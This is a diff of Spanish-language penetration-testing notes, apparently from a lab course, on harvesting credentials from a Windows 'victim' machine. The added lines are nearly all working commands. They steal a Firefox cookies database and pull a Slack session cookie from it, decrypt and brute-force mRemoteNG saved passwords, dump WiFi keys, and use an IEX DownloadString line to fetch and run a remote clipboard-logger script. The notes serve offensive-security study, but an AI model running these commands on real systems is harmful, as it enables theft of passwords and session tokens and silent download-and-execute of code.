@@ -28,10 +28,6 @@ Una vez que lo metimos en la pc victima lo corremos con:
 
     findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
 
-#### También traer contraseñas de chrome:
-
-    gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
-
 #### Powershell History
 
     gc (Get-PSReadLineOption).HistorySavePath
@@ -83,7 +79,19 @@ Podemos usar herramientas como sharpchrome para lograrlo
 
         .\SharpChrome.exe logins /unprotect
 
+#### También traer contraseñas de chrome:
 
+    gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
+
+#### Extraer contraseñas de firefox
+Firefox guarda sus contraseñas en una sqlite
+
+##### Robamos la sqlite de la victima
+    copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
+##### En la pc atacante:
+    python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d
+
+    
 #### Extraer credenciales de Putty, Winscp, Filezilla, SuperPutty y RDP
 para esto podemos usar SessionGopher
 
@@ -100,4 +108,17 @@ para esto podemos usar SessionGopher
         netsh wlan show profile
 ##### 2) Dumpeamos los datos
         netsh wlan show profile <red> key=clear
-        
+
+### mRemteNG
+- mRemoteNG es un software que permite conectarse con sistemas remotos mediante VNC,RDP, SSH y otros.
+- Guarda las credenciales en el archivo confCons.xml
+- su contraseña por defecto es mR3m
+- La ubicación de confCons.xml es <user>\appdata\roaming\mremoteng
+  #### Desencriptar un password de mremoteng con la contraseña por default
+      python3 mremoteng_decrypt.py -s "<password>"
+  #### Desencriptar un mremoteng con custom password
+      for password in $(cat /usr/share/wordlists/fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s "<pass>" -p $password 2>/dev/null;done
+
+### Obtener el clipboard
+    IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
+    Invoke-ClipboardLogger
